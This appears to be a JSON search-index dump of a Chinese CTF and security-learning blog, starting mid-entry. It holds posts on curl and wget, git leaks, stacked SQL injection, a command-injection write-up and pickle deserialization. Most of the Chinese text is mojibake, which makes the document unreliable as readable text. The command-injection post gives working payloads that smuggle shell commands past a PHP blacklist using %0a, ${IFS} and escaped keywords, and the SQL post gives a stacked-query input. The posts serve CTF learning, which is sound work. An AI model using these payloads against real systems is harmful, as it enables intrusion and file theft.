å¯¹åº”æƒé™ï¼šrwxr-xr-x","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"wget&curl","slug":"wget-curl","date":"2020-03-23T12:54:28.000Z","updated":"2020-04-21T15:59:27.626Z","comments":true,"path":"2020/03/23/wget-curl/","link":"","permalink":"https://polosec.github.io/2020/03/23/wget-curl/","excerpt":"","text":"è‡´æ•¬https://www.cnblogs.com/duhuo/p/5695256.html curlåŸºæœ¬ç”¨æ³•ä¸‹è½½curl www.baidu.com ï¼ˆé»˜è®¤getæ–¹å¼è®¿é—®www.baidu.com å¹¶ä¸”å°†htmlä»£ç å›æ˜¾ï¼‰curl www.baidu.com &gt;&gt; baidu.html ä¿å­˜ä¸ºbaidu.htmlcurl -o 2.jpg www.baidu.com/1.jpg ä¸‹è½½1.jpgå¹¶ä¿å­˜ä¸º2.jpg ftpä¸‹è½½ï¼šcurl -o -u username:password ftp://www.baidu.com ftpä¸Šä¼ curl -T todo.jpg -u username:password ftp://www.baidu.com wgetwgetå‘½ä»¤ç”¨æ¥ä»æŒ‡å®šçš„URLä¸‹è½½æ–‡ä»¶ã€‚wgetéå¸¸ç¨³å®šï¼Œå®ƒåœ¨å¸¦å®½å¾ˆçª„çš„æƒ…å†µä¸‹å’Œä¸ç¨³å®šç½‘ç»œä¸­æœ‰å¾ˆå¼ºçš„é€‚åº”æ€§ï¼Œå¦‚æœæ˜¯ç”±äºç½‘ç»œçš„åŸå› ä¸‹è½½å¤±è´¥ï¼Œwgetä¼šä¸æ–­çš„å°è¯•ï¼Œç›´åˆ°æ•´ä¸ªæ–‡ä»¶ä¸‹è½½å®Œæ¯•ã€‚å¦‚æœæ˜¯æœåŠ¡å™¨æ‰“æ–­ä¸‹è½½è¿‡ç¨‹ï¼Œå®ƒä¼šå†æ¬¡è”åˆ°æœåŠ¡å™¨ä¸Šä»åœæ­¢çš„åœ°æ–¹ç»§ç»­ä¸‹è½½ã€‚è¿™å¯¹ä»é‚£äº›é™å®šäº†é“¾æ¥æ—¶é—´çš„æœåŠ¡å™¨ä¸Šä¸‹è½½å¤§æ–‡ä»¶éå¸¸æœ‰ç”¨ã€‚ åŸºæœ¬ç”¨æ³•wget -i filelist.txt ä¼šä¸‹è½½filelist.txté‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ã€‚wget -c www.baidu.com/iso.iso æ”¯æŒæ–­ç‚¹ç»­ä¼ wget -r -np www.baidu.com/pack/ npè¡¨ç¤ºä¸éå†çˆ¶ç›®å½•ï¼Œndè¡¨ç¤ºä¸åœ¨æœ¬æœºé‡æ–°åˆ›å»ºç›®å½•ç»“æ„wget -O filename www.baidu.com/1.php å°†æ–‡ä»¶å‘½åä¸ºfilenameå¹¶ä¿å­˜","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://polosec.github.io/tags/linux/"}]},{"title":"gitå¿«é€Ÿå…¥é—¨&&gitæ³„éœ²","slug":"gitå¿«é€Ÿå…¥é—¨-gitæ³„éœ²","date":"2020-03-20T15:18:05.000Z","updated":"2020-03-29T12:35:49.120Z","comments":true,"path":"2020/03/20/gitå¿«é€Ÿå…¥é—¨-gitæ³„éœ²/","link":"","permalink":"https://polosec.github.io/2020/03/20/git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8-git%E6%B3%84%E9%9C%B2/","excerpt":"","text":"gitå­¦ä¹ é“¾æ¥:https://learngitbranching.js.org/https://bingohuang.gitbooks.io/progit2/content/10-git-internals/sections/objects.htmlhttps://zhuanlan.zhihu.com/p/44741777 gitæ³„éœ²åŸç†ï¼šé€šè¿‡.gitæ–‡ä»¶å¤¹ä»¥åŠå­ç›®å½•ã€æ–‡ä»¶å¯ä»¥è¿˜åŸå·¥ç¨‹æºä»£ç ã€‚è¿‡ç¨‹ï¼š1.è§£æ.git/indexæ–‡ä»¶ï¼Œæ‰¾åˆ°å·¥ç¨‹æ‰€æœ‰ï¼šï¼ˆæ–‡ä»¶åï¼Œæ–‡ä»¶sha1ï¼‰2.å».git/objects/æ–‡ä»¶å¤¹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶3.zlibè§£å‹æ–‡ä»¶ï¼ŒæŒ‰åŸå§‹çš„ç›®å½•ç»“æ„å†™å…¥æºä»£ç åˆ©ç”¨å·¥å…·ï¼šGitHack åˆ©ç”¨åœºæ™¯git stash æš‚å­˜å½“å‰æ²¡æœ‰å®Œæˆçš„å·¥ä½œï¼Œå½“å¤„ç†å®Œbugåå¯ä»¥é€šè¿‡ git stash pop å°†ä¹‹å‰æ²¡åšå®Œçš„å·¥ä½œåˆå¹¶è¿‡æ¥ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡ git stash pop å¼¹å‡ºä¹‹å‰å°šæœªæäº¤çš„æ–‡ä»¶git reset â€“hard HEADï½1 (æˆ–æ˜¯ç‰ˆæœ¬å·)æ„ä¸ºå°†ç‰ˆæœ¬åº“å›é€€1ä¸ªç‰ˆæœ¬ï¼Œä½†æ˜¯ä¸ä»…ä»…æ˜¯å°†æœ¬åœ°ç‰ˆæœ¬åº“çš„å¤´æŒ‡é’ˆå…¨éƒ¨é‡ç½®åˆ°æŒ‡å®šç‰ˆæœ¬ï¼Œä¹Ÿä¼šé‡ç½®æš‚å­˜åŒºï¼Œå¹¶ä¸”ä¼šå°†å·¥ä½œåŒºä»£ç ä¹Ÿå›é€€åˆ°è¿™ä¸ªç‰ˆæœ¬git diff hash å¯¹æ¯”å½“å‰ç‰ˆæœ¬ä¸hashç‰ˆæœ¬æäº¤çš„åŒºåˆ«ã€‚git checkout hash åˆ‡æ¢åˆ°hashç‰ˆæœ¬çš„æäº¤ä¸­ã€‚/åˆ‡æ¢åˆ†æ”¯git branch -a //show all branches é’ˆå¯¹ç»ƒä¹ ç»ƒä¹ å¹³å°ï¼šCTFHUB https://www.ctfhub.com/#/skilltreeæŠ€èƒ½æ ‘-web-ä¿¡æ¯æ³„éœ²-git","categories":[{"name":"git","slug":"git","permalink":"https://polosec.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://polosec.github.io/tags/git/"}]},{"title":"å †å æ³¨å…¥","slug":"å †å æ³¨å…¥","date":"2020-03-17T06:30:29.000Z","updated":"2020-03-17T07:25:22.029Z","comments":true,"path":"2020/03/17/å †å æ³¨å…¥/","link":"","permalink":"https://polosec.github.io/2020/03/17/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","excerpt":"","text":"åŸºæœ¬æ¦‚å¿µå°†åŸæ¥çš„è¯­å¥æ„é€ å®ŒååŠ ä¸Šåˆ†å·ï¼Œä»£è¡¨è¯¥è¯­å¥ç»“æŸï¼Œåé¢å†è¾“å…¥çš„å°±æ˜¯æ–°çš„sqlè¯­å¥ã€‚ ä½¿ç”¨æ¡ä»¶å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶æœ‰é™ã€‚åªæœ‰å½“è°ƒç”¨æ•°æ®åº“å‡½æ•°æ”¯æŒæ‰§è¡Œå¤šæ¡sqlè¯­å¥æ—¶æ‰èƒ½å¤Ÿä½¿ç”¨ï¼Œæ¯”å¦‚phpä¸­çš„mysqli_multi_query()å‡½æ•°ã€‚sql=â€select * from flag where id=$_POST[â€˜idâ€™]â€;åˆ™å¯æ„é€ :1;select * from flagç»ƒä¹ é¢˜ï¼šBUUCTF [SUCTF 2019]EasySQL","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"å‘½ä»¤æ³¨å…¥ç»•è¿‡&URLè§£æ","slug":"å‘½ä»¤æ³¨å…¥ç»•è¿‡-URLè§£æ","date":"2020-03-16T12:09:50.000Z","updated":"2020-03-16T14:35:05.694Z","comments":true,"path":"2020/03/16/å‘½ä»¤æ³¨å…¥ç»•è¿‡-URLè§£æ/","link":"","permalink":"https://polosec.github.io/2020/03/16/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-URL%E8%A7%A3%E6%9E%90/","excerpt":"","text":"é¢˜ç›®ç¯å¢ƒï¼šctfhub-ç»¼åˆå‘½ä»¤æ³¨å…¥è‡´æ•¬ã€å‚è€ƒï¼šå›è½¦&amp;æ¢è¡Œ é¢˜ç›®åˆ†æ123456789101112131415&lt;?php$res = FALSE;if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123; $ip = $_GET[&#x27;ip&#x27;]; $m = []; if (!preg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123; $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;; exec($cmd, $res); &#125; else &#123; $res = $m; &#125;&#125;?&gt; é€šè¿‡é˜…è¯»æºç å‘ç°ï¼Œè¿‡æ»¤äº†| &amp; ; ç©ºæ ¼ / cat flag ctfhubè¿™å‡ ä¸ªå…³é”®å­—ã€‚ä¸ç»•è¿‡çš„è¯æ ¹æœ¬æ—¥ä¸è¿›å»ã€‚æ¥ä¸‹æ¥è€ƒè™‘ç»•è¿‡é¦–å…ˆå…ˆlsä¸€ä¸‹çœ‹çœ‹é‡Œé¢æœ‰å•¥ã€‚æƒ³lsï¼Œé¦–å…ˆè¦æŠŠåˆ†éš”ç¬¦ç»•è¿‡äº†æ‰èƒ½lsã€‚è¿™é‡Œé‡‡ç”¨URLç¼–ç ,å³%0aä»£è¡¨æ¢è¡Œç¬¦ã€‚å°è¯•ï¼šæˆåŠŸã€‚æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åšçš„æ˜¯æŸ¥çœ‹flag_is_hereæ–‡ä»¶å¤¹æœ‰å•¥ã€‚ï¼ˆæˆ–è®¸ä¸æ˜¯æ–‡ä»¶å¤¹ï¼‰è¿™é‡Œç”±äºè¿‡æ»¤äº†flagå­—æ®µå’Œç©ºæ ¼ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨fl\\agè¿™ç§å½¢å¼ç»•è¿‡flagï¼Œé‡‡ç”¨${IFS}ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚payload:ip=127.0.0.1%0als${IFS}fl\\ag_is_hereä¹‹åå¾—åˆ°ç»“æœflag_5145112918545.phpã€‚ä¸‹ä¸€æ­¥å°±åº”è¯¥åº·åº·è¿™é‡Œé¢æœ‰ä»€ä¹ˆäº†ã€‚å‡è®¾å½“å‰ç›®å½•ä¸º/ï¼Œæˆ‘ä»¬éœ€è¦è¯»å–/flag_is_here/flag_5145112918545.phpæ–‡ä»¶çš„å†…å®¹ã€‚ç»§ç»­åˆ†æã€‚ç”±äºè¿‡æ»¤äº†è·¯å¾„åˆ†éš”ç¬¦\\ï¼Œè€ƒè™‘é‡‡ç”¨ç»¼åˆå‘½ä»¤ï¼šå…ˆcdè¿›å…¥flag_is_hereæ–‡ä»¶å¤¹ï¼Œç„¶åcat flag_5145112918545.phpæ–‡ä»¶ï¼Œå½“ç„¶ï¼Œé’ˆå¯¹catçš„ç»•è¿‡æœ‰å¾ˆå¤šæ–¹æ³• æ¯”å¦‚ca\\t æˆ–è€…ç›´æ¥sort flag_5145112918545.phppayload:ip=127.0.0.1%0acd${IFS}fl\\ag_is_here%0aca\\t${IFS}fl\\ag_5145112918545.phpæˆ–è€…æŠŠca\\tæ¢æˆsortã€‚ä¸€æ · æ³¨æ„å†…å®¹ï¼šè¿™é‡Œæ¢è¡Œç¬¦éœ€è¦æ³¨æ„ã€‚æ¢è¡Œç¬¦çš„URLç¼–ç ä¸º%0a,é‡‡ç”¨GETæ–¹å¼ã€‚æ‰€ä»¥éœ€è¦ä½ ç›´æ¥ä½¿ç”¨GETæ–¹å¼æäº¤æ•°æ®ï¼Œè€Œä¸èƒ½åœ¨è¾“å…¥æ¡†è¾“å…¥æ•°æ®ã€‚å› ä¸ºåœ¨è¾“å…¥æ¡†è¾“å…¥æ•°æ®åï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urlencode()çš„è¿‡ç¨‹ï¼Œä¼šæŠŠ%0aå†æ¬¡urlç¼–ç æˆåˆ«çš„ã€‚è¿™å°±ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„äº†ã€‚æ‰€ä»¥å¯ä»¥ç”¨hackbaræˆ–è€…burpç›´æ¥ç”¨getæ–¹å¼æäº¤ã€‚å¸¸è§å‘½ä»¤æ³¨å…¥ç»•è¿‡å§¿åŠ¿å…ˆçœ‹è‡´æ•¬ã€å‚è€ƒé“¾æ¥ä¸­çš„å›è½¦&amp;æ¢è¡Œã€‚command1 &amp;&amp; command2 cmd1æˆåŠŸæ‰§è¡Œåæ‰§è¡Œcmd2command1 | command2 åªæ‰§è¡Œcommand2cmd1 || cmd2 cmd1ä¸æˆåŠŸæ‰§è¡Œåˆ™æ‰§è¡Œcmd2command1 &amp; command2 å…ˆæ‰§è¡Œcommand2åæ‰§è¡Œcommand1ç©ºæ ¼ç»•è¿‡ï¼ˆä»¥ã€ä¸ºåˆ†ç•Œï¼‰ï¼š&lt;ã€&lt;&gt;ã€${IFS}ã€$IFS$9$IFS ä»£è¡¨åˆ†éš”ç¬¦ï¼Œ$9ä»£è¡¨å½“å‰ç³»ç»Ÿshellè¿›ç¨‹ä¸­çš„ç¬¬ä¹ä¸ªå‚æ•°æŒæœ‰è€…ï¼Œå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼šcat ${IFS}filename ===cat $IFS$9filename ===cat filenmae;ç»•è¿‡ï¼šé¦–å…ˆè¦çŸ¥é“;ä»£è¡¨è¿ç»­æŒ‡ä»¤ï¼Œç®€å•åœ°è¯´å°±æ˜¯ç”¨;å¯ä»¥æŠŠå¤šæ¡æŒ‡ä»¤å†™ä¸€è¡Œç„¶ååˆ†åˆ«æ‰§è¡Œã€‚ç»•è¿‡æ–¹æ³•ï¼šä½¿ç”¨%0aç¼–ç ç»•è¿‡ã€‚åŸç†ï¼šå‡è®¾åŸå‘½ä»¤ä¸ºcmd1;cmd2;cmd3\\nä½¿ç”¨%0aç»•è¿‡åï¼šcmd1%0acmd2%0acmd3%0a ==&gt;cmd1\\ncmd2\\ncmd3\\n æ³¨æ„ç†è§£æ¢è¡Œç¬¦çš„æ¦‚å¿µã€‚å°±çŸ¥é“ä¸ºä»€ä¹ˆè¿™æ ·å¯ä»¥ç»•è¿‡äº†ã€‚ï¼ˆç²—æš´çš„ç†è§£:ä¸€ä¸ª\\nå°±ä»£è¡¨\\nå‰é¢çš„å‘½ä»¤æ‰§è¡Œä¸€æ¬¡ï¼‰é»‘åå•å­—ç¬¦ç»•è¿‡ï¼ša=fl;b=ag;$a$b -&gt;flagcat ca\\t -&gt;catæˆ–è€…ç”¨åˆ«çš„æ–¹æ³•ã€‚æ¯”å¦‚å¯ä»¥ç”¨sort/head/tail/strings æ›¿æ¢cat#URLè§£æå…¨è¿‡ç¨‹ä»€ä¹ˆæ˜¯URLåŒºåˆ†URL\\URIURLç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼Œç”¨äºäº’è”ç½‘ä¸Šä¸åŒçš„èµ„æºçš„æ ‡è¯†ï¼Œå°±åƒä¸åŒçš„äººæœ‰ä¸åŒçš„èº«ä»½è¯ä¸€æ ·ã€‚URLåŒ…æ‹¬åè®®ã€åŸŸåã€è·¯å¾„ã€å‚æ•°ã€æŸ¥è¯¢ç­‰ã€‚æ¯”å¦‚ï¼šhttp://polosec.github.io/index.html URLç¼–ç è§„åˆ™Urlç¼–ç é€šå¸¸ä¹Ÿè¢«ç§°ä¸ºç™¾åˆ†å·ç¼–ç ï¼Œç¼–ç æ–¹å¼éå¸¸ç®€å•ï¼Œä½¿ç”¨%ç™¾åˆ†å·åŠ ä¸Šä¸¤ä½çš„å­—ç¬¦â€”â€”0123456789ABCDEFâ€”â€”ä»£è¡¨ä¸€ä¸ªå­—èŠ‚çš„åå…­è¿›åˆ¶å½¢å¼ã€‚Urlç¼–ç é»˜è®¤ä½¿ç”¨çš„å­—ç¬¦é›†æ˜¯US-ASCIIã€‚ä¾‹å¦‚aåœ¨US-ASCIIç ä¸­å¯¹åº”çš„å­—èŠ‚æ˜¯0x61ï¼Œé‚£ä¹ˆUrlç¼–ç ä¹‹åå¾—åˆ°çš„å°±æ˜¯%61ï¼Œæˆ‘ä»¬åœ¨åœ°å€æ ä¸Šè¾“å…¥ http://g.cn/search?q=%61%62%63 ï¼Œå®é™…ä¸Šå°±ç­‰åŒäºåœ¨googleä¸Šæœç´¢abcäº†ã€‚åˆå¦‚@ç¬¦å·åœ¨ASCIIå­—ç¬¦é›†ä¸­å¯¹åº”çš„å­—èŠ‚ä¸º0x40ï¼Œç»è¿‡Urlç¼–ç ä¹‹åå¾—åˆ°çš„æ˜¯%40ã€‚å¯¹äºéASCIIå­—ç¬¦ï¼Œéœ€è¦ä½¿ç”¨ASCIIå­—ç¬¦é›†çš„è¶…é›†è¿›è¡Œç¼–ç å¾—åˆ°ç›¸åº”çš„å­—èŠ‚ï¼Œç„¶åå¯¹æ¯ä¸ªå­—èŠ‚æ‰§è¡Œç™¾åˆ†å·ç¼–ç ã€‚å¯¹äºUnicodeå­—ç¬¦ï¼ŒRFCæ–‡æ¡£å»ºè®®ä½¿ç”¨utf-8å¯¹å…¶è¿›è¡Œç¼–ç å¾—åˆ°ç›¸åº”çš„å­—èŠ‚ï¼Œç„¶åå¯¹æ¯ä¸ªå­—èŠ‚æ‰§è¡Œç™¾åˆ†å·ç¼–ç ã€‚å¦‚â€ä¸­æ–‡â€ä½¿ç”¨UTF-8å­—ç¬¦é›†å¾—åˆ°çš„å­—èŠ‚ä¸º0xE4 0xB8 0xAD 0xE6 0x96 0x87ï¼Œç»è¿‡Urlç¼–ç ä¹‹åå¾—åˆ°â€%E4%B8%AD%E6%96%87â€ã€‚ URLç¼–ç /è§£ç æ—¶é—´èŠ‚ç‚¹å‘é€è¯·æ±‚çš„æ—¶å€™å®¢æˆ·ç«¯ä¼šè‡ªåŠ¨ç¼–ç ï¼ŒæœåŠ¡å™¨ç«¯æ¥å—åˆ°è¯·æ±‚åä¼šè‡ªåŠ¨è§£ç ï¼›ç„¶åç¼–ç å‘é€ç»™å®¢æˆ·ç«¯ï¼›å®¢æˆ·ç«¯å†è§£ç ã€‚å…³äºäºŒæ¬¡ç¼–ç /äºŒæ¬¡è§£ç çš„é—®é¢˜ï¼šäºŒæ¬¡ç¼–ç &amp;äºŒæ¬¡è§£ç ç”¨æ¥è§£å†³ä¸­æ–‡ç¼–ç åä¹±ç çš„é—®é¢˜ åŸŸåè§£æè¾“å…¥URLæŒ‰å›è½¦åï¼Œé¦–å…ˆè¿›è¡Œçš„æ˜¯åŸŸåè§£ææ“ä½œã€‚é¦–å…ˆæŸ¥çœ‹ç¼“å­˜ï¼šä¾æ¬¡æŸ¥æ‰¾æµè§ˆå™¨å†…éƒ¨ç¼“å­˜ã€æœ¬æœºhostsæ–‡ä»¶ã€æœ¬åœ°è·¯ç”±å™¨ç¼“å­˜ã€ç„¶åæ˜¯ISPæä¾›å•†çš„ç¼“å­˜ã€‚å¦‚æœç¼“å­˜éƒ½æ²¡æœ‰çš„è¯ï¼Œåˆ™æœ¬åœ°DNSæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨è¿›è¡Œè¿­ä»£æŸ¥è¯¢ï¼ŒæŸ¥è¯¢åˆ°ç»“æœåè¿”å›ç»™ä¸»æœºã€‚é€’å½’æŸ¥è¯¢ã€è¿­ä»£æŸ¥è¯¢ è¿›è¡ŒTCPè¿æ¥(ä¸‰æ¬¡æ¡æ‰‹)è·å–åˆ°æœåŠ¡å™¨IPåœ°å€åï¼Œæµè§ˆå™¨ä¼šä»¥ä¸€ä¸ªéšæœºç«¯å£å‘æœåŠ¡å™¨çš„80(é»˜è®¤)ç«¯å£å‘èµ·TCPè¿æ¥è¯·æ±‚ã€‚ å®¢æˆ·ç«¯å‘é€HTTPè¯·æ±‚å»ºç«‹è¿æ¥åï¼Œæµè§ˆå™¨å‘é€ä¸€ä¸ªHTTPè¯·æ±‚ã€‚è¯·æ±‚åŒ…å«è¯·æ±‚å¤´å’Œè¯·æ±‚æ­£æ–‡ã€‚è¯·æ±‚å¤´ä¸€èˆ¬åŒ…æ‹¬è¯·æ±‚æ–¹æ³•ï¼Œèµ„æºè·¯å¾„ï¼ŒHTTPåè®®ç‰ˆæœ¬ã€cookieã€hostã€acceptç­‰å­—æ®µã€‚è¯·æ±‚æ­£æ–‡åˆ™æ˜¯å®¢æˆ·ç«¯å‘é€çš„ä¿¡æ¯ã€‚ æœåŠ¡å™¨å“åº”HTTPè¯·æ±‚HTTPå“åº”åŒ…æ‹¬äº†çŠ¶æ€è¡Œã€å“åº”å¤´ã€å“åº”æ­£æ–‡ã€‚çŠ¶æ€è¡Œæ ‡è¯†äº†httpåè®®ç‰ˆæœ¬ä¸çŠ¶æ€ç ã€‚å“åº”å¤´åŒ…å«äº†ä¸€äº›å­—æ®µã€‚æ¯”å¦‚set-cookie,date,allow,content-encodingç­‰å­—æ®µã€‚ä»¥K:Vå½¢å¼å‡ºç°ã€‚ æµè§ˆå™¨æ˜¾ç¤ºhtmlé¡µé¢1.åŠ è½½è§£æHTMLï¼Œå¼€å§‹æ„å»ºDOMæ ‘ã€‚2.é‡åˆ°CSSå¤–é“¾ï¼Œå¼‚æ­¥åŠ è½½è§£æCSSï¼Œæ„å»ºCSSè§„åˆ™æ ‘ã€‚3.é‡åˆ°scriptæ ‡ç­¾ï¼Œå¦‚æœæ˜¯æ™®é€šJSæ ‡ç­¾åˆ™åŒæ­¥åŠ è½½å¹¶æ‰§è¡Œï¼Œé˜»å¡é¡µé¢æ¸²æŸ“ï¼Œå¦‚æœæ ‡ç­¾ä¸Šæœ‰defer/asyncå±æ€§åˆ™å¼‚æ­¥åŠ è½½JSèµ„æºã€‚è®¾ç½®deferçš„JSèµ„æºä¼šåœ¨DOMContentLoadedäº‹ä»¶ä¹‹å‰æ‰§è¡Œï¼›è®¾ç½®äº†asyncçš„JSèµ„æºåŠ è½½å®Œå°±æ‰§è¡Œã€‚4.åˆå¹¶DOMæ ‘å’ŒCSSè§„åˆ™æ ‘ç”Ÿæˆrenderæ ‘ã€‚5.å¸ƒå±€renderæ ‘ï¼Œè®¡ç®—å„å…ƒç´ çš„å°ºå¯¸ã€ä½ç½®ç­‰ï¼Œåœ¨å†…å­˜ä¸Šç”ŸæˆBitmapã€‚6.æ¸²æŸ“renderæ ‘ï¼Œå°†å†…å­˜ä¸Šçš„Bitmapç»˜åˆ¶åˆ°å±å¹•ä¸Šã€‚ é¡µé¢åŠ è½½å®Œæˆ","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"buuç™»å½•æµé‡åˆ†æ","slug":"buuç™»å½•æµé‡åˆ†æ","date":"2020-03-14T14:21:56.000Z","updated":"2020-03-14T14:25:19.703Z","comments":true,"path":"2020/03/14/buuç™»å½•æµé‡åˆ†æ/","link":"","permalink":"https://polosec.github.io/2020/03/14/buu%E7%99%BB%E5%BD%95%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"é¢„å¤‡çŸ¥è¯†ï¼šwiresharkåŸºæœ¬æ“ä½œé¢˜ç›®åˆ†æï¼šé»‘å®¢é€šè¿‡wiresharkæŠ“åˆ°ç®¡ç†å‘˜ç™»é™†ç½‘ç«™çš„ä¸€æ®µæµé‡åŒ…ï¼ˆç®¡ç†å‘˜çš„å¯†ç å³æ˜¯ç­”æ¡ˆ) æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤æ‰“å¼€æ•°æ®åŒ…é¦–å…ˆè€ƒè™‘ç™»å½•é¡µé¢ï¼Œå¾€ä¸‹ç¨å¾®ç¿»äº†ä¸€ä¸‹å°±çœ‹åˆ°äº†ä¸€ä¸ªæ„æ€ç™»å½•é¡µé¢ï¼ˆç¼–å·20ï¼‰ æ˜¯å‘user.phpæäº¤æ•°æ®ï¼Œç›²çŒœç™»é™†ç•Œé¢ã€‚ç„¶åè¿½è¸ªæµ-TCPæµï¼Œå³å¯çœ‹åˆ°å¯†ç ã€‚ è¿™åº”è¯¥æ˜¯ç¬¬ä¸€é“ç§’çš„é¢˜ å¤ªèœäº†ã€‚","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"}]},{"title":"python pickleååºåˆ—åŒ–åˆæ­¥å­¦ä¹ ","slug":"python-pickleååºåˆ—åŒ–åˆæ­¥å­¦ä¹ ","date":"2020-03-12T10:41:38.000Z","updated":"2020-03-12T12:16:59.445Z","comments":true,"path":"2020/03/12/python-pickleååºåˆ—åŒ–åˆæ­¥å­¦ä¹ /","link":"","permalink":"https://polosec.github.io/2020/03/12/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"é¢„å¤‡çŸ¥è¯†ï¼špythonã€pickleã€stackã€é¢å‘å¯¹è±¡åŸºç¡€è‡´æ•¬ï¼šä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ &amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿æ³¨æ„ï¼šæ­¤ç¯‡æ–‡ç« éœ€å…ˆé€šè¯»æ–‡ç« é“¾æ¥ä¸­çš„ä¸€äº›åŸºç¡€æ¦‚å¿µï¼Œå¦åˆ™ç†è§£èµ·æ¥å¯èƒ½å­˜åœ¨å›°éš¾ï¼Œåœ¨å¯¹ä¾‹é¢˜è¿›è¡Œè®²è§£çš„è¿‡ç¨‹ä¸­ä¸ä¼šè¿‡å¤šé˜è¿°åŸºç¡€æ¦‚å¿µã€‚ BBå‡ å¥å…¶å®ä¹‹å‰æ²¡æ€ä¹ˆæ¥è§¦è¿‡python pickleæ¨¡å—çš„ååºåˆ—åŒ–ï¼Œæˆ–è€…è¯´æ²¡æ¥è§¦è¿‡ååºåˆ—åŒ–ï¼Œè¿™æ¬¡â€é«˜æ ¡æŠ—ç–«â€CTFçº¿ä¸Šèµ›ç»™æˆ‘ä¸Šäº†ä¸€è¯¾ã€‚æœ‰ä¸€é“webtmpçš„é¢˜ç›®ï¼Œæ˜¯ä¸python pickleæ¨¡å—çš„ååºåˆ—åŒ–æœ‰å…³ï¼Œæˆ‘ä¹Ÿæ‰¾åˆ°äº†éå¸¸è¯¦ç»†çš„è§£æ(è‡´æ•¬éƒ¨åˆ†å·²è´´å‡º)ï¼Œä½†æ˜¯æ²¡æœ‰æ²‰ä¸‹å¿ƒè®¤çœŸåœ°å»ä¸€æ­¥æ­¥åœ°åšï¼Œæ‰€ä»¥è¿™é“é¢˜ä¹Ÿæ²¡æœ‰åšå‡ºæ¥ï¼Œå…¶å®è¿™é“é¢˜ä¸éš¾ï¼Œåšå‡ºæ¥çš„å¸ˆå‚…è¿˜æ˜¯å¾ˆå¤šçš„ã€‚ç›¸åï¼Œå†…å­˜å–è¯çš„ä¸€é“é¢˜æˆ‘æ ¹æ®æ•™ç¨‹ä¸€æ­¥æ­¥åšå‡ºæ¥äº†ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¹‹å‰webæ²¡åšå‡ºæ¥è¿‡é¢˜å¯¼è‡´äº†è¿™ä¸ªç»“æœã€‚è¿˜éœ€åŠªåŠ›ï¼ ç›¸å…³æ¦‚å¿µå»ºè®®é€šè¯» è‡´æ•¬æ–‡ç« ã€‚éœ€è¦æ˜ç¡®çš„æ¦‚å¿µï¼šæ•°æ®ç»“æ„â€“æ ˆã€‚pythonæ•°æ®ç±»å‹ï¼šlistã€tupleã€dict Pythonä¸­listï¼ˆåˆ—è¡¨ï¼‰ã€dictï¼ˆå­—å…¸ï¼‰ã€tupleï¼ˆå…ƒç»„ï¼‰ã€setï¼ˆé›†åˆï¼‰è¯¦ç»†ä»‹ç»pickleã€pickletools ï¼šè¯¦è§è‡´æ•¬éƒ¨åˆ†é“¾æ¥ã€‚ é¢˜ç›®åˆ†æç¬¬ä¸€é¢˜ï¼šé¢˜ç›®é“¾æ¥ï¼šHITCTFé¢˜ç›®æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import base64import picklefrom flask import Flask, Response, render_template, requestimport pickletools,sysapp = Flask(__name__)class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f&#x27;Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)&#x27; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categorydef read(filename, encoding=&#x27;utf-8&#x27;): with open(filename, &#x27;r&#x27;, encoding=encoding) as fin: return fin.read()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index(): if request.args.get(&#x27;source&#x27;): return Response(read(__file__), mimetype=&#x27;text/plain&#x27;) if request.method == &#x27;POST&#x27;: try: pickle_data = request.form.get(&#x27;data&#x27;) if b&#x27;R&#x27; in base64.b64decode(pickle_data): return &#x27;No... I don\\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27; else: result = pickle.loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return &#x27;Are you sure that is an animal???&#x27; correct = (result == Animal(favorite.name, favorite.category)) return render_template(&#x27;unpickle_result.html&#x27;, result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: return &#x27;something wrong...&#x27; sample_obj = 